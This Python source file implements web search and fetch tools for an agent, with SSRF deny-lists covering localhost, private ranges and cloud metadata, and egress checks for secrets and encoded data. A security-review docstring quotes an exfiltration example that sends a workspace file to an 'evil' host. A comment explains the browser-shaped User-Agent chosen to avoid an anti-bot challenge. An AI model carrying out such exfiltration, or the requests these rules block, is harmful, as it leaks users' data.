"""Lightweight web-search + web-fetch primitives for the KIT agent.

When a user's project pulls in an external library (BoTorch, Ax, SMAC,
DEAP), the agent needs to look up API specifics that aren't in the
indexed DELFIN docs. These helpers provide just enough capability for
that workflow without requiring API keys:

* :func:`web_search` queries DuckDuckGo's HTML endpoint and parses
  the result list (title + URL + snippet). DDG is used because it
  doesn't require auth and respects the "/html/" interface.
* :func:`web_fetch` downloads a single URL and returns plain-text
  content (headers, scripts and styles stripped). For HTML, a basic
  tag-strip yields readable text; PDFs and binary content are
  rejected so the agent doesn't get base64 garbage in chat.

A network deny-list keeps the tools off internal / metadata
endpoints. Both functions cap response size and timeout to avoid
runaway downloads.

These tools intentionally do NOT import any third-party packages
beyond the stdlib + ``urllib`` so they work in the bare DELFIN
install (no extra ``requests`` / ``beautifulsoup4`` dependency).
"""

from __future__ import annotations

import contextvars
import html as _html
import http.client
import ipaddress
import json
import math
import os
import re
import socket
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Optional


# Browser-shaped, and still says who is calling. The shape is the part that
# matters: measured 2026-08-28 against html.duckduckgo.com, same host, same
# minute, same query --
#
#   Mozilla/5.0 (DELFIN-KIT-agent; +https://kit.edu)      HTTP 202,  0 results
#   Mozilla/5.0 (X11 …) Chrome/124 … DELFIN/1.0           HTTP 200, 10 results
#   Mozilla/5.0 (X11 …) Chrome/124 …                      HTTP 200, 10 results
#   Mozilla/5.0 (X11 …) Firefox/127.0                     HTTP 202,  0 results
#
# So the 202 was never the network and never the endpoint -- it was this
# string. The code here used to say "measured on this host, every real query
# comes back that way", which was true and misattributed: every query WITH
# OUR AGENT came back that way. The DELFIN token is kept because a search
# tool that hides who it is would be the wrong trade for a fix that does not
# need it.
_USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0 Safari/537.36 DELFIN/1.0 (+https://kit.edu)"
)
_MAX_BYTES = 1_000_000           # 1 MB cap
_DEFAULT_TIMEOUT_S = 15
_BLOCKED_HOST_PATTERNS = (
    re.compile(r"^localhost$", re.I),
    re.compile(r"^127\."),
    re.compile(r"^0\.0\.0\.0$"),
    re.compile(r"^169\.254\."),       # link-local (cloud metadata)
    re.compile(r"^10\."),
    re.compile(r"^192\.168\."),
    re.compile(r"^172\.(1[6-9]|2\d|3[0-1])\."),
    re.compile(r".*\.internal$", re.I),
    re.compile(r".*\.local$", re.I),
)


@dataclass
class SearchHit:
    title: str
    url: str
    snippet: str


# Carrier-grade NAT space is not ``is_private`` in Python 3.13, and cluster
# and VPN internals live there.
_CGNAT_NET = ipaddress.ip_network("100.64.0.0/10")
# A lookup URL has no business carrying this much data.
_MAX_QUERY_CHARS = 2000


def _known_secret_values() -> list[str]:
    """The values of every credential DELFIN holds (file, keyring and
    well-known env), for an exact-match egress check and for scrub_secrets
    on every tool result. Never raises; short values ignored."""
    out: list[str] = []
    try:
        from .credentials import _WELL_KNOWN_KEYS, held_secret_values
        for val in held_secret_values():
            if isinstance(val, str) and len(val) >= 12:
                out.append(val)
        for name in _WELL_KNOWN_KEYS:
            val = os.environ.get(name, "")
            if len(val) >= 12:
                out.append(val)
    except Exception:
        pass
    return out


def outbound_secret_reason(text: str) -> Optional[str]:
    """Why ``text`` must not leave the machine (a URL or a search query), or None.

    Security review 2026-09-16: web_fetch and web_search sent whatever the
    model put into them -- web_fetch("https://evil/?d=<a workspace file>")
    went straight out, and a search query reaches up to five third parties.
    Refused: a credential DELFIN holds (exact value, also URL-encoded), any
    shape the output guard redacts (API keys, tokens, private keys,
    password assignments, passwords in URLs), and a query too long to be a
    lookup.
    """
    raw = str(text or "")
    try:
        decoded = urllib.parse.unquote_plus(raw)
    except Exception:
        decoded = raw
    for secret in _known_secret_values():
        if secret in raw or secret in decoded:
            return "it contains a credential DELFIN holds"
    try:
        from .output_guard import _redact_secrets
        findings: list = []
        _redact_secrets(decoded, findings)
        if findings:
            return "it contains something shaped like a secret (key, token or password)"
    except Exception:
        pass
    try:
        query = urllib.parse.urlparse(raw).query
    except Exception:
        query = ""
    if len(query) > _MAX_QUERY_CHARS:
        return f"its query string is {len(query)} characters, too long to be a lookup"
    return None


#: Above this many characters a URL's query is data, not a lookup, for a
#: request nobody can be asked about (``url_payload_reason``).
_MAX_UNATTENDED_QUERY_CHARS = 256
_TOKEN_RE = re.compile(r"[A-Za-z0-9+/=_\-]{16,}")
_UUID_RE = re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
                      r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")


def _entropy(text: str) -> float:
    counts: dict = {}
    for ch in text:
        counts[ch] = counts.get(ch, 0) + 1
    n = len(text)
    return -sum(c / n * math.log2(c / n) for c in counts.values())


def _random_token(text: str) -> Optional[str]:
    """The first run of characters in ``text`` that looks like encoded
    data rather than words, or None.

    Encoded data: a hex run of 16+ characters with a digit and a letter
    (a hash, a hex dump), a UUID, or a token of 16+ characters whose
    longest piece between ``-_.`` is 12+ characters, with Shannon entropy
    of at least 3.3 bits per character and either digits that alternate
    with letters four or more times, five or more case changes together
    with a digit or ``+/`` (base64), or 16+ letters with fewer than one
    vowel in five (base32-like).

    Calibrated (2026-11-13) on 3000 random samples per encoding and 31
    tokens that real documentation and literature URLs carry (method
    names such as ``B3LYP-D3BJ-def2-TZVP``, DOIs, wheel tags, CamelCase
    identifiers): no false positive; missed 0.4% of 16-hex markers, 0% of
    UUIDs, 2% of base64, 12% of URL-safe base64 and a third of base32.
    Data spelled as words is not seen; this is a bound on what an
    unattended URL carries unnoticed, not a proof that it carries nothing.
    Rejected: an entropy threshold alone (method names and wheel tags
    score as high as short base64)."""
    for tok in _TOKEN_RE.findall(text or ""):
        core = tok.strip("=-_")
        if len(core) < 16:
            continue
        for run in re.findall(r"[0-9a-fA-F]{16,}", core):
            if re.search(r"\d", run) and re.search(r"[a-fA-F]", run):
                return tok
        if _UUID_RE.search(core):
            return tok
        if max(len(p) for p in re.split(r"[-_.]", core)) < 12:
            continue
        if _entropy(core) < 3.3:
            continue
        kinds = ["d" if c.isdigit() else "a" if c.isalpha() else "o" for c in core]
        flips = sum(1 for a, b in zip(kinds, kinds[1:])
                    if a != b and "o" not in (a, b))
        if re.search(r"\d", core) and flips >= 4:
            return tok
        case_flips = sum(1 for a, b in zip(core, core[1:])
                         if a.isalpha() and b.isalpha()
                         and a.islower() != b.islower())
        if case_flips >= 5 and re.search(r"[\d+/]", core):
            return tok
        letters = [c for c in core.lower() if c.isalpha()]
        if len(letters) >= 16 and sum(c in "aeiouy" for c in letters) < 0.2 * len(letters):
            return tok
    return None


def url_payload_reason(url: str) -> Optional[str]:
    """Why ``url`` carries data rather than a lookup, or None.

    Input: an http(s) URL a request nobody can be asked about would send.
    Looked at: the query (decoded) and the host name's labels; the
    fragment is never sent and is ignored. Data: a query longer than
    ``_MAX_UNATTENDED_QUERY_CHARS`` characters, or a run that looks like
    encoded data (``_random_token``). The path is not looked at: commit
    hashes and identifiers are ordinary there, and the host decision
    (``egress_proxy``) already limits whom an unattended path reaches.
    """
    try:
        parts = urllib.parse.urlsplit(str(url or ""))
    except ValueError:
        return "it is not a URL that can be read"
    query = parts.query or ""
    if len(query) > _MAX_UNATTENDED_QUERY_CHARS:
        return (f"its query string is {len(query)} characters, more than a "
                f"lookup needs ({_MAX_UNATTENDED_QUERY_CHARS})")
    try:
        decoded = urllib.parse.unquote_plus(query)
    except Exception:
        decoded = query
    tok = _random_token(decoded)
    if tok:
        return f"its query carries a run that looks like encoded data ({tok[:12]}...)"
    for label in (parts.hostname or "").split("."):
        tok = _random_token(label)
        if tok:
            return f"its host name carries a run that looks like encoded data ({tok[:12]}...)"
    return None


def text_payload_reason(text: str) -> Optional[str]:
    """``url_payload_reason`` for a search query: a run that looks like
    encoded data, or None."""
    tok = _random_token(str(text or ""))
    if tok:
        return f"it carries a run that looks like encoded data ({tok[:12]}...)"
    return None


def _check_url(url: str) -> Optional[str]:
    """Return an error string if the URL is forbidden, else None."""
    why = outbound_secret_reason(url)
    if why:
        return (f"refused to send this URL: {why}. Nothing was sent; "
                "remove the data from the URL")
    try:
        parsed = urllib.parse.urlparse(url)
    except Exception as exc:
        return f"invalid URL: {exc}"
    if parsed.scheme not in ("http", "https"):
        return f"only http(s) URLs are supported (got {parsed.scheme!r})"
    host = (parsed.hostname or "").strip()
    if not host:
        return "URL has no host component"
    for pat in _BLOCKED_HOST_PATTERNS:
        if pat.match(host):
            return (
                f"host {host!r} is on the network deny-list "
                "(localhost / RFC1918 / cloud metadata / *.internal)"
            )
    # Resolve and check the IP too, so DNS rebinding doesn't slip
    # past the hostname pattern check.
    try:
        for af, _, _, _, sockaddr in socket.getaddrinfo(host, None):
            ip_str = sockaddr[0]
            try:
                ip = ipaddress.ip_address(ip_str)
            except ValueError:
                continue
            if ip.is_loopback or ip.is_link_local or ip.is_private \
                    or ip.is_multicast or ip.is_reserved or ip.is_unspecified \
                    or ip in _CGNAT_NET:
                return (
                    f"resolved IP {ip_str} for host {host!r} is "
                    "private/loopback/link-local — refused"
                )
    except socket.gaierror as exc:
        return f"DNS lookup failed: {exc}"
    return None


#: Set by the caller for the length of one fetch: ``gate(url)`` returns why
#: a redirect target must not be followed, or None. The agent's executor
#: sets the session's egress decision here (api_client._web_egress_refusal)
#: so a hop gets the host decision and the payload check the first URL got;
#: unset, a hop gets the address checks only.
REDIRECT_GATE: contextvars.ContextVar = contextvars.ContextVar(
    "delfin_web_redirect_gate", default=None)


class _GuardedRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Re-validate every redirect target: the caller's egress decision
    (``REDIRECT_GATE``) first, before the name is resolved, then
    _check_url. Without the address check a public URL could 3xx-redirect
    to http://169.254.169.254/… (cloud metadata) or http://127.0.0.1/… —
    SSRF that defeats the initial host/IP deny-list. Without the egress
    decision a known host's open redirect, or a URL shortener, carried
    what the first URL's path held to an unknown host."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        gate = REDIRECT_GATE.get()
        if gate is not None:
            try:
                why = gate(newurl)
            except Exception as exc:
                why = f"the egress decision failed ({exc})"
            if why:
                raise urllib.error.HTTPError(
                    newurl, code, f"blocked redirect target: {why}", headers, fp)
        err = _check_url(newurl)
        if err is not None:
            raise urllib.error.HTTPError(
                newurl, code, f"blocked redirect target: {err}", headers, fp)
        return super().redirect_request(req, fp, code, msg, headers, newurl)


def _ip_refusal(ip_str: str, host: str) -> Optional[str]:
    try:
        ip = ipaddress.ip_address(ip_str.split("%", 1)[0])
    except ValueError:
        return f"unparseable address {ip_str!r} for host {host!r}"
    if getattr(ip, "ipv4_mapped", None) is not None:
        ip = ip.ipv4_mapped
    if ip.is_loopback or ip.is_link_local or ip.is_private \
            or ip.is_multicast or ip.is_reserved or ip.is_unspecified \
            or ip in _CGNAT_NET:
        return (f"resolved IP {ip_str} for host {host!r} is "
                "private/loopback/link-local — refused")
    return None


def _checked_create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT,
                               source_address=None, **_kw):
    """``socket.create_connection`` that connects only to an address it has
    just checked.

    ``_check_url`` resolved the name and urllib resolved it again to
    connect: a name that answers with a public address the first time and
    127.0.0.1 or the cloud metadata address the second (DNS rebinding)
    passed the check and reached the private one. Here the name is resolved
    once, each address is checked, and the socket goes to that address."""
    host, port = address
    last: Optional[BaseException] = None
    refusal = ""
    for af, socktype, proto, _canon, sockaddr in socket.getaddrinfo(
            host, port, 0, socket.SOCK_STREAM):
        why = _ip_refusal(str(sockaddr[0]), str(host))
        if why:
            refusal = why
            continue
        sock = None
        try:
            sock = socket.socket(af, socktype, proto)
            if timeout is not socket._GLOBAL_DEFAULT_TIMEOUT:
                sock.settimeout(timeout)
            if source_address:
                sock.bind(source_address)
            sock.connect(sockaddr)
            return sock
        except OSError as exc:
            last = exc
            if sock is not None:
                sock.close()
    if refusal:
        raise OSError(f"refused: {refusal}")
    raise last if last is not None else OSError(f"no address for {host!r}")


class _CheckedHTTPConnection(http.client.HTTPConnection):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self._create_connection = _checked_create_connection


class _CheckedHTTPSConnection(http.client.HTTPSConnection):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self._create_connection = _checked_create_connection


class _CheckedHTTPHandler(urllib.request.HTTPHandler):
    def http_open(self, req):
        # Through a configured proxy the connection goes to the proxy, which
        # resolves the name itself; the URL was still checked beforehand.
        cls = http.client.HTTPConnection if req.has_proxy() else _CheckedHTTPConnection
        return self.do_open(cls, req)


class _CheckedHTTPSHandler(urllib.request.HTTPSHandler):
    def https_open(self, req):
        cls = (http.client.HTTPSConnection if getattr(req, "_tunnel_host", None)
               else _CheckedHTTPSConnection)
        return self.do_open(cls, req, context=self._context)


_GUARDED_OPENER = None


def _guarded_opener():
    global _GUARDED_OPENER
    if _GUARDED_OPENER is None:
        _GUARDED_OPENER = urllib.request.build_opener(
            _GuardedRedirectHandler(), _CheckedHTTPHandler(),
            _CheckedHTTPSHandler())
    return _GUARDED_OPENER


def _fetch_bytes(url: str, timeout_s: int,
                 want_status: bool = False, headers: Optional[dict] = None):
    """GET a URL with a strict cap. Returns (body, content_type).

    With ``want_status`` the HTTP status comes along as a third element:
    a search endpoint answering 202 has served a challenge page, not an
    empty result set, and the caller has to be able to tell those apart.
    ``headers`` are added to the request (a keyed engine's token).
    """
    req = urllib.request.Request(
        url, headers={"User-Agent": _USER_AGENT, "Accept": "text/html,*/*",
                      **(headers or {})}
    )
    # Use the redirect-guarding opener so each hop is re-checked against the
    # deny-list (the initial URL is already validated by the caller).
    with _guarded_opener().open(req, timeout=timeout_s) as resp:
        ctype = resp.headers.get("Content-Type", "")
        body = resp.read(_MAX_BYTES + 1)
        status = int(getattr(resp, "status", 0) or getattr(resp, "code", 0) or 0)
    if want_status:
        return body, ctype, status
    return body, ctype


def _html_to_text(body: bytes) -> str:
    """Minimal HTML → plain text. Drops <script>/<style> and tags."""
    try:
        text = body.decode("utf-8", errors="replace")
    except Exception:
        return ""
    # Strip script + style first (their contents are not user-readable).
    #
    # The end tag is matched as </script\s*> because HTML permits whitespace
    # before the ">", and a page closing with "</script >" would otherwise
    # slip past: the block would stay, the generic tag rule below would remove
    # only the two tags around it, and the script body would arrive in the
    # answer as prose. An unclosed <script> is treated the same way and runs
    # to the end of the document, which is what a browser does with it.
    text = re.sub(r"<script[^>]*>.*?(?:</script\s*>|\Z)", " ", text,
                  flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r"<style[^>]*>.*?(?:</style\s*>|\Z)", " ", text,
                  flags=re.DOTALL | re.IGNORECASE)
    # Tags → space (don't merge adjacent words across tag boundaries).
    text = re.sub(r"<[^>]+>", " ", text)
    text = _html.unescape(text)
    # Collapse whitespace runs but preserve line breaks for readability.
    text = re.sub(r"[ \t]+", " ", text)
    text = re.sub(r"\n[ \t]+", "\n", text)
    text = re.sub(r"\n{3,}", "\n\n", text)
    return text.strip()


def web_fetch(url: str, *, timeout_s: int = _DEFAULT_TIMEOUT_S) -> dict:
    """Download a URL, return text + metadata.

    Returns ``{"url", "status", "content_type", "text", "truncated"}``
    on success or ``{"error": ...}`` on failure. ``text`` is plain
    text for HTML responses; binary content types yield an explanatory
    error rather than garbage.
    """
    err = _check_url(url)
    if err:
        return {"error": err, "url": url}
    try:
        body, ctype = _fetch_bytes(url, timeout_s)
    except urllib.error.HTTPError as exc:
        return {"error": f"HTTP {exc.code}: {exc.reason}", "url": url}
    except urllib.error.URLError as exc:
        return {"error": f"network error: {exc.reason}", "url": url}
    except Exception as exc:
        return {"error": f"fetch failed: {exc}", "url": url}

    truncated = len(body) > _MAX_BYTES
    if truncated:
        body = body[:_MAX_BYTES]
    ctype_lower = ctype.lower()
    if "text/html" in ctype_lower or "application/xhtml" in ctype_lower:
        text = _html_to_text(body)
    elif ctype_lower.startswith("text/"):
        text = body.decode("utf-8", errors="replace")
    else:
        return {
            "error": (
                f"unsupported content type {ctype!r}; web_fetch returns "
                "plain text only (HTML, text/*). PDFs / binaries must "
                "be fetched via bash + downloaded to a local file."
            ),
            "url": url,
            "content_type": ctype,
        }
    if len(text) > 50_000:
        text = text[:50_000]
        truncated = True
    return {
        "url": url,
        "status": "ok",
        "content_type": ctype,
        "text": text,
        "truncated": truncated,
        "bytes": len(body),
    }


def _openalex_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
    """Scholarly works from OpenAlex (key optional; mailto only if configured).

    Returns [{title, url, snippet, source}] or [] on any failure -- a
    fallback that raises is no fallback.
    """
    try:
        params = {
            "search": query, "per-page": max(1, min(int(max_results), 10)),
            "select": "title,doi,publication_year,primary_location,authorships"}
        # The contact address is the person's own, optional setting
        # (DELFIN_CONTACT_EMAIL / literature.contact_email), never a
        # built-in one; OpenAlex no longer requires it (terms 2026-11).
        try:
            from .scholarly_sources import contact_email
            mail = contact_email()
        except Exception:
            mail = ""
        if mail:
            params["mailto"] = mail
        url = "https://api.openalex.org/works?" + urllib.parse.urlencode(params)
        body = _fetch_bytes(url, timeout_s)[0]
        data = json.loads(body.decode("utf-8", errors="replace"))
    except Exception:
        return []
    hits: list[dict] = []
    for w in (data.get("results") or []):
        title = str(w.get("title") or "").strip()
        doi = str(w.get("doi") or "").strip()
        loc = w.get("primary_location") or {}
        landing = str(loc.get("landing_page_url") or "").strip()
        link = doi or landing
        if not title or not link.startswith(("http://", "https://")):
            continue
        venue = ((loc.get("source") or {}).get("display_name") or "").strip()
        year = w.get("publication_year") or ""
        authors = [((a.get("author") or {}).get("display_name") or "").strip()
                   for a in (w.get("authorships") or [])[:3]]
        authors = [a for a in authors if a]
        snippet = ", ".join(x for x in (", ".join(authors), venue, str(year)) if x)
        hits.append({"title": title, "url": link, "snippet": snippet[:300],
                     "source": "openalex"})
    return hits


def _wikipedia_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
    """Article titles and links from Wikipedia's opensearch (no key)."""
    try:
        url = "https://en.wikipedia.org/w/api.php?" + urllib.parse.urlencode({
            "action": "opensearch", "search": query,
            "limit": max(1, min(int(max_results), 10)), "format": "json"})
        body = _fetch_bytes(url, timeout_s)[0]
        data = json.loads(body.decode("utf-8", errors="replace"))
        titles, descs, links = data[1], data[2], data[3]
    except Exception:
        return []
    hits: list[dict] = []
    for title, desc, link in zip(titles, descs, links):
        if title and str(link).startswith(("http://", "https://")):
            hits.append({"title": str(title), "url": str(link),
                         "snippet": str(desc or "")[:300], "source": "wikipedia"})
    return hits


def _ddg_instant_answer(query: str, timeout_s: int) -> list[dict]:
    """Fallback search via the DuckDuckGo Instant Answer JSON API.

    A real API (not HTML scraping), so it still works where the ``/html/``
    endpoint is blocked by anti-bot 202 challenges (e.g. datacenter IPs).
    Returns result-shaped dicts from the entity Abstract + RelatedTopics —
    strong for factual / chemistry-entity queries (Wikipedia-sourced).
    Best-effort: any failure returns ``[]``.
    """
    url = "https://api.duckduckgo.com/?" + urllib.parse.urlencode({
        "q": query, "format": "json", "no_html": 1, "skip_disambig": 1,
    })
    if _check_url(url):
        return []
    try:
        body, _ctype = _fetch_bytes(url, timeout_s)
        data = json.loads(body.decode("utf-8", errors="replace"))
    except Exception:
        return []
    out: list[dict] = []
    abstract = (data.get("AbstractText") or "").strip()
    if abstract:
        out.append({
            "title": (data.get("Heading") or query).strip(),
            "url": data.get("AbstractURL") or "",
            "snippet": abstract[:300],
        })
    for topic in (data.get("RelatedTopics") or []):
        if not isinstance(topic, dict):
            continue
        # RelatedTopics may nest a category's items under "Topics".
        items = topic.get("Topics") if "Topics" in topic else [topic]
        for it in items:
            if not isinstance(it, dict):
                continue
            t = (it.get("Text") or "").strip()
            u = it.get("FirstURL") or ""
            if t and u.startswith(("http://", "https://")):
                out.append({"title": t[:80], "url": u, "snippet": t[:300]})
    return out


_RESET_ATTEMPTS = 3


# ---------------------------------------------------------------------------
# Keyed engines: a real search index when the user has a key for one.
# ---------------------------------------------------------------------------
#
# DuckDuckGo's HTML endpoint is scraped and challenged; OpenAlex and
# Wikipedia are indexes, not the web. With a key the agent searches the way
# an assistant with a search API does. Keys come from the credential store
# (env var or ~/.delfin credential file): GOOGLE_CSE_API_KEY + GOOGLE_CSE_CX
# for Google's Custom Search JSON API, BRAVE_SEARCH_API_KEY for Brave
# Search. Absent keys cost nothing; a failing keyed engine falls through to
# the keyless chain and is named in the error.

def _credential(name: str) -> str:
    try:
        from .credentials import load_credential
        return str(load_credential(name) or "").strip()
    except Exception:
        return ""


def _google_cse_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
    key, cx = _credential("GOOGLE_CSE_API_KEY"), _credential("GOOGLE_CSE_CX")
    if not key or not cx:
        return []
    url = ("https://www.googleapis.com/customsearch/v1?"
           + urllib.parse.urlencode({"key": key, "cx": cx, "q": query,
                                     "num": max(1, min(int(max_results), 10))}))
    body, _ctype = _fetch_bytes(url, timeout_s)[:2]
    data = json.loads(body.decode("utf-8", errors="replace"))
    hits = []
    for item in data.get("items") or []:
        link = str(item.get("link") or "")
        if link.startswith(("http://", "https://")):
            hits.append({"title": str(item.get("title") or "").strip(),
                         "url": link,
                         "snippet": str(item.get("snippet") or "").strip()[:300],
                         "index": "google"})
    return hits[:max_results]


def _brave_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
    key = _credential("BRAVE_SEARCH_API_KEY")
    if not key:
        return []
    url = ("https://api.search.brave.com/res/v1/web/search?"
           + urllib.parse.urlencode({"q": query, "count": max(1, min(int(max_results), 20))}))
    body, _ctype = _fetch_bytes(url, timeout_s, headers={
        "Accept": "application/json", "X-Subscription-Token": key})[:2]
    data = json.loads(body.decode("utf-8", errors="replace"))
    hits = []
    for item in ((data.get("web") or {}).get("results") or []):
        link = str(item.get("url") or "")
        if link.startswith(("http://", "https://")):
            hits.append({"title": str(item.get("title") or "").strip(),
                         "url": link,
                         "snippet": str(item.get("description") or "").strip()[:300],
                         "index": "brave"})
    return hits[:max_results]


_KEYED_ENGINES = (("google", _google_cse_search), ("brave", _brave_search))


def keyed_engines_configured() -> list[str]:
    """Which keyed engines have a key here, by name."""
    out = []
    if _credential("GOOGLE_CSE_API_KEY") and _credential("GOOGLE_CSE_CX"):
        out.append("google")
    if _credential("BRAVE_SEARCH_API_KEY"):
        out.append("brave")
    return out


def _keyed_search(query: str, max_results: int, timeout_s: int) -> tuple[list[dict], str, str]:
    """(hits, source, error) from the first keyed engine that answers."""
    error = ""
    for name, fn in _KEYED_ENGINES:
        try:
            hits = fn(query, max_results, timeout_s)
        except Exception as exc:
            error = f"{name}: {type(exc).__name__}: {str(exc)[:80]}"
            continue
        if hits:
            return hits, name, ""
    return [], "", error


def _is_connection_reset(exc: BaseException) -> bool:
    """A connection the peer reset, however the platform spells it."""
    reason = getattr(exc, "reason", exc)
    if isinstance(reason, ConnectionResetError):
        return True
    text = str(reason).lower()
    return "connection reset" in text or "errno 104" in text or "econnreset" in text


def web_search(query: str, *, max_results: int = 8,
               timeout_s: int = _DEFAULT_TIMEOUT_S) -> dict:
    """DuckDuckGo search: HTML result list, with an Instant-Answer fallback
    when the HTML endpoint returns nothing (e.g. blocked by a 202 anomaly)."""
    if not query.strip():
        return {"error": "query must be non-empty"}
    _why = outbound_secret_reason(query)
    if _why:
        return {"error": f"refused to send this search query: {_why}. "
                         "Nothing was sent to any search engine."}
    keyed_hits, keyed_source, keyed_error = _keyed_search(query, max_results, timeout_s)
    if keyed_hits:
        return {"query": query, "results": keyed_hits, "source": keyed_source}
    encoded = urllib.parse.urlencode({"q": query})
    url = f"https://duckduckgo.com/html/?{encoded}"
    err = _check_url(url)
    if err:
        return {"error": err}
    # The search endpoint resets the connection now and then -- two of
    # three calls in a field session and one of two from the office
    # network, in the same minute (2026-09-11). A reset is not an
    # answer, so it is tried again, twice, before it is reported as one.
    _attempts = 0
    while True:
        _attempts += 1
        try:
            # Tolerate a two-value _fetch_bytes: the parameter is new, and a
            # replacement that predates it (a test double, a patched build)
            # must not turn into "search failed". Status 0 then means "not
            # known", which is deliberately NOT evidence of anything below.
            try:
                _fetched = _fetch_bytes(url, timeout_s, want_status=True)
            except TypeError:
                _fetched = _fetch_bytes(url, timeout_s)
            body, ctype = _fetched[0], _fetched[1]
            status = int(_fetched[2]) if len(_fetched) > 2 else 0
            break
        except urllib.error.HTTPError as exc:
            return {"error": f"HTTP {exc.code}: {exc.reason}"}
        except urllib.error.URLError as exc:
            if _is_connection_reset(exc) and _attempts < _RESET_ATTEMPTS:
                time.sleep(0.5 * _attempts)
                continue
            suffix = (f" (after {_attempts} attempts)" if _attempts > 1 else "")
            return {"error": f"network error: {exc.reason}{suffix}"}
        except Exception as exc:
            return {"error": f"search failed: {exc}"}

    text = body.decode("utf-8", errors="replace")
    # DDG HTML markup: each result is in a <div class="result__body">
    # block with <a class="result__a" href="..."> for the title and
    # <a class="result__snippet"> for the description. We use a loose
    # regex so minor markup churn doesn't break the parse.
    pattern = re.compile(
        r'<a[^>]+class="[^"]*result__a[^"]*"[^>]+href="([^"]+)"[^>]*>'
        r'(.*?)</a>'
        r'.*?<a[^>]+class="[^"]*result__snippet[^"]*"[^>]*>'
        r'(.*?)</a>',
        re.DOTALL | re.IGNORECASE,
    )
    hits: list[dict] = []
    for href, title_html, snippet_html in pattern.findall(text):
        # DDG wraps result URLs through their tracker ?uddg=... — unwrap.
        url_clean = href
        if href.startswith("//duckduckgo.com/l/?") or href.startswith("/l/?"):
            qs = urllib.parse.urlparse(href).query
            params = urllib.parse.parse_qs(qs)
            if "uddg" in params:
                url_clean = urllib.parse.unquote(params["uddg"][0])
        title_clean = _html.unescape(re.sub(r"<[^>]+>", "", title_html)).strip()
        snippet_clean = _html.unescape(
            re.sub(r"<[^>]+>", "", snippet_html)
        ).strip()
        if title_clean and url_clean.startswith(("http://", "https://")):
            hits.append({
                "title": title_clean,
                "url": url_clean,
                "snippet": snippet_clean[:300],
            })
        if len(hits) >= max_results:
            break

    source = "duckduckgo-html"
    if not hits:
        ia = _ddg_instant_answer(query, timeout_s)
        if ia:
            hits = ia[:max_results]
            source = "duckduckgo-instant-answer"
    if not hits:
        # A second and a third backend, keyless and answering from here
        # and from the cluster while DuckDuckGo challenged every query
        # (2026-09-11, HTTP 202 on all three of its endpoints). OpenAlex
        # is the scholarly index a scientific question wants first;
        # Wikipedia's opensearch covers names and concepts. Each result
        # says which index it came from.
        fallback = _openalex_search(query, max_results, timeout_s)
        if fallback:
            hits, source = fallback, "openalex"
        else:
            fallback = _wikipedia_search(query, max_results, timeout_s)
            if fallback:
                hits, source = fallback, "wikipedia"

    if not hits:
        # "No results" and "the search engine refused to answer" look the
        # same to a caller and mean opposite things. A 202 with no result
        # markup is an anti-bot challenge -- measured on this host, every
        # real query comes back that way -- and reporting it as an empty
        # result set is what pushes a model to answer from memory instead.
        # Say it is a backend failure, and name the alternative, because a
        # working search does exist here under another server.
        # 202 is unambiguous: measured on this host, every real query comes
        # back that way. A 200 needs care -- a query with genuinely nothing
        # to find looks similar, and calling that "blocked" would be a
        # different lie. The engine says so in words when it means it.
        _said_empty = any(
            phrase in text.lower() for phrase in
            ("no results found", "keine ergebnisse", "no results for"))
        if status == 202:
            reason = (f"the search backend refused this request (HTTP {status}"
                      ": an anti-bot challenge, not an empty result set)")
        elif status and not _said_empty:
            reason = ("the result page could not be parsed: no result markup "
                      "and no 'no results' notice, so whether anything "
                      "matched is unknown")
        else:
            reason = ""
        if reason:
            return {"error": (
                f"{reason}. No results were retrieved and none should be "
                "inferred. The reason does not depend on the wording, so "
                "rephrasing this query and calling again will fail the same "
                "way. If a web search tool from another server is available, use "
                "that; otherwise tell the user the search could not run and "
                "ask them for a URL."),
                "query": query, "results": [], "result_count": 0,
                "source": "duckduckgo-unavailable", "http_status": status}

    return {"query": query, "results": hits, "result_count": len(hits),
            "source": source}
